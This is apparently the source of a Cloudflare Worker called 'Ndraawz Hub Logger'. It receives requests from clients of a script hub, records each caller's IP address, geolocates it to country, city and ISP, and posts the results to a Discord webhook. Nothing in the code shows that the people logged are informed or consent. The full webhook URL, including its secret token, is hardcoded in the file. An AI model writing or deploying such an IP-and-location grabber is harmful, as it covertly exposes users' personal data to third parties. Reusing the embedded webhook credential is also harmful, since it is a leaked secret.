// Cloudflare Workers version

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";

const BOT_USERNAME = "Ndraawz Hub Logger";
const BOT_AVATAR_URL = "https://cdn.discordapp.com/attachments/1464912658108125278/1472698650848395451/icon.png";
const FOOTER_ICON_URL = "https://cdn.discordapp.com/attachments/1464912658108125278/1472698650848395451/icon.png";
const EMBED_COLOR = 0x00e5ff;

async function getGeoInfo(ip) {
    try {
        const url = `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,as,org,query`;
        const response = await fetch(url);
        const json = await response.json();
        
        if (json.status === 'success') {
            return {
                country: json.country || "N/A",
                region: json.regionName || "N/A",
                city: json.city || "N/A",
                isp: json.isp || "N/A",
                as: json.as || "N/A",
                org: json.org || "N/A"
            };
        }
        return null;
    } catch (e) {
        return null;
    }
}

async function sendToDiscord(embed) {
    const payload = {
        username: BOT_USERNAME,
        avatar_url: BOT_AVATAR_URL,
        embeds: [embed]
    };

    try {
        const response = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        return response.status === 204 || response.status === 200;
    } catch (e) {
        return false;
    }
}

export default {
    async fetch(request, env, ctx) {
        // CORS headers
        const corsHeaders = {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
        };

        // Handle OPTIONS preflight
        if (request.method === 'OPTIONS') {
            return new Response(null, {
                status: 204,
                headers: corsHeaders
            });
        }

        // Only allow POST
        if (request.method !== 'POST') {
            return new Response(JSON.stringify({ error: 'Method Not Allowed' }), {
                status: 405,
                headers: {
                    ...corsHeaders,
                    'Content-Type': 'application/json'
                }
            });
        }

        // Get client IP
        const clientIp = request.headers.get('x-forwarded-for')?.split(',')[0] || 
                        request.headers.get('cf-connecting-ip') ||
                        request.headers.get('x-real-ip') || 
                        "unknown";
        const cleanIp = clientIp.replace('::ffff:', '').trim();

        try {
            // Parse request body
            const data = await request.json();
            
            if (!data) {
                return new Response(JSON.stringify({ error: 'Empty body' }), {
                    status: 400,
                    headers: {
                        ...corsHeaders,
                        'Content-Type': 'application/json'
                    }
                });
            }

            // Handle security type
            if (data.type === "security") {
                const embed = {
                    title: "❗️ Ndraawz Security System ❗️",
                    description: data.message || "No message",
                    color: EMBED_COLOR,
                    footer: { text: "Ndraawz Logger System", icon_url: FOOTER_ICON_URL },
                    timestamp: new Date().toISOString()
                };
                await sendToDiscord(embed);
                return new Response(JSON.stringify({ ok: true }), {
                    status: 200,
                    headers: {
                        ...corsHeaders,
                        'Content-Type': 'application/json'
                    }
                });
            }

            // Handle player type
            if (data.type === "player" && Array.isArray(data.fields)) {
                const geoData = await getGeoInfo(cleanIp);

                const allFields = [
                    ...data.fields,
                    { name: "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value: "ㅤ", inline: false },
                    { name: "📡 IP Address", value: cleanIp || "N/A", inline: false }
                ];

                if (geoData) {
                    allFields.push(
                        { name: "🚩 Country", value: geoData.country, inline: false },
                        { name: "📍 Region", value: geoData.region, inline: false },
                        { name: "🏙️ City", value: geoData.city, inline: false },
                        { name: "🏢 ISP", value: geoData.isp, inline: false },
                        { name: "📡 AS / Org", value: `${geoData.as} / ${geoData.org}`, inline: false }
                    );
                } else {
                    allFields.push({ name: "⚠️ Info", value: "Geolokasi gagal diambil", inline: false });
                }

                const embed = {
                    title: "🚀 Ndraawz Logger System",
                    color: EMBED_COLOR,
                    fields: allFields,
                    footer: { text: "Ndraawz Logger System", icon_url: FOOTER_ICON_URL },
                    timestamp: new Date().toISOString()
                };

                await sendToDiscord(embed);
                return new Response(JSON.stringify({ ok: true }), {
                    status: 200,
                    headers: {
                        ...corsHeaders,
                        'Content-Type': 'application/json'
                    }
                });
            }

            return new Response(JSON.stringify({ error: 'Invalid request format' }), {
                status: 400,
                headers: {
                    ...corsHeaders,
                    'Content-Type': 'application/json'
                }
            });

        } catch (err) {
            console.error(`[LOG] Error: ${err.message}`);
            return new Response(JSON.stringify({ error: 'Invalid JSON' }), {
                status: 400,
                headers: {
                    ...corsHeaders,
                    'Content-Type': 'application/json'
                }
            });
        }
    }
};
